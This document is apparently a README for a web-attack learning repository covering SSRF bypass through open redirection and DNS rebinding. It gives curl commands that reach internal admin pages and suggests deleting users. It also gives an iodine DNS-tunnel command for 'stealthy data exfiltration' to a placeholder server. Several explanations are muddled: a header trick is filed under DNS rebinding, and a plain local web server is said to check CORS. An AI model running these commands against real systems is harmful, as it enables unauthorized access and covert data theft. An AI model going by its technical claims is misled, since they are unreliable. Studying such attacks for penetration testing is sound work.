# Introduction to Web Attacks

This repository is dedicated to providing information and examples about various types of web attacks. Web attacks are a major concern in today's internet era, where attackers exploit vulnerabilities in web applications to gain unauthorized access, steal sensitive data, or disrupt services.

## Contents

1. [SSRF Basic Filter Bypasses](#ssrf-basic-filter-bypasses)
2. [DNS Rebinding: SSRF Filter Bypass](#dns-rebinding-ssrf-filter-bypass)
3. [DNSbinding: Same-Origin Policy Bypass](#dns-rebinding-same-origin-policy-bypass)
4. [DNS Rebinding: Tools & Prevention](#dns-rebinding-tools--prevention)
5. [More to come...]

# SSRF with Filter Bypass via Open Redirection

Server-Side Request Forgery (SSRF) remains a potent threat to web security. Understanding the essentials of basic filter bypass techniques forms the foundation of effective penetration testing.

## Example Command

```bash
curl -i http://vulnerable-server.local/request?url=http://internal-server.local/
```

![Redirect Example 1](https://i.postimg.cc/2y6jR0LB/redirectnb2.png)
![Redirect Example 2](https://i.postimg.cc/j5qtPMXk/redirect3.png)

## Exploiting the Vulnerability

- Notice that changing the `stockApi` parameter directly is blocked.

- **Crafting the Exploit URL:**
  - Create a crafted URL to exploit the redirection, such as redirecting to the admin interface:
    ```plaintext
    /product/nextProduct?path=http://192.168.0.12:8080/admin
    ```

- **Using the Exploit URL:**
  - Utilize this URL in the `stockApi` parameter:
    ```bash
    curl -i "http://vulnerable-server.local/product/nextProduct?path=http://192.168.0.12:8080/admin"
    ```

- **Exploiting the Vulnerability:**
  - The stock checker follows the redirection and displays the admin page. Modify the path to perform actions like deleting a user.

These steps illustrate how an open redirection vulnerability can be exploited to bypass SSRF filters and execute unauthorized actions on internal systems.

## DNS Rebinding: SSRF Filter Bypass

DNS Rebinding enhances SSRF attacks by circumventing only DNS-result-checked filters at request time. This section details this tactic through practical commands.

### Commands:

```bash
dig +short attacker-controlled-domain.com
```

- ![DNS Rebinding SSRF Command Screenshot](assets/images/dns_rebinding_ssrf_command.png)
- *Description: This command uses `dig` to inquire an attacker-controlled domain that alternates IP addresses, thus manipulating DNS responses and bypassing SSRF filters.*

```bash
curl -H "X-Forwarded-For: internal-server.local" http://vulnerable-server.local/api
```

- ![SSRF Header Exploit Screenshot](assets/images/ssrf_header_exploit.png)
- *Description: Demonstrates the bypass of SSRF protection via HTTP headers, using `X-Forwarded-For` to masquer as an internal entity.*

## DNS Rebinding: Same-Origin Policy Bypass

The Same-Origin Policy is a vital browser security protocol. DNS Rebinding attacks can bypass this policy to exploit vulnerabilities.

### Test Command:

```bash
python -m SimpleHTTPServer
```

- ![SOP Bypass Command Screenshot](assets/images/sop_bypass_command.png)
- *Description: Establishes a local server to check cross-origin resource sharing (CORS) issues exploitable via DNS Rebinding.*

## DNS Rebinding: Tools & Prevention

Understanding both offensive and defensive tools is crucial in mitigating DNS Rebinding threats. The following tools and commands are recommended.

### Tool Example:

```bash
nslookup your-target-domain.com
```

- ![DNS Tool Command Screenshot](assets/images/dns_tool_command.png)
- *Description: This `nslookup` exploration helps pinpoint potential harmful DNS configurations susceptible to Rebinding attacks.*

```bash
nmap --script=dns-rebinding target-site.com
```

- ![DNS Rebinding Nmap Scan Screenshot](assets/images/dns_rebinding_nmap_scan.png)
- *Description: Utilizes Nmapâ€™s DNS rebinding script to detect vulnerabilities on the target site.*

### Advanced DNS Tunneling Command:

```bash
iodine -f -P password -T CNAME tunnel.your-server.com
```

- ![Advanced DNS Tunneling Screenshot](assets/images/advanced_dns_tunneling.png)
- *Description: Sets up a DNS tunnel using `iodine`, allowing data encapsulation within DNS queries and responses for stealthy data exfiltration.*

## License

This project is under the MIT License. For more details, please refer to the [LICENSE.md](LICENSE.md) file.

This README is crafted to provide a comprehensive yet accessible guide. It serves as an invaluable resource for both novices and seasoned pentesters looking to deepen their understanding of sophisticated network security challenges.  
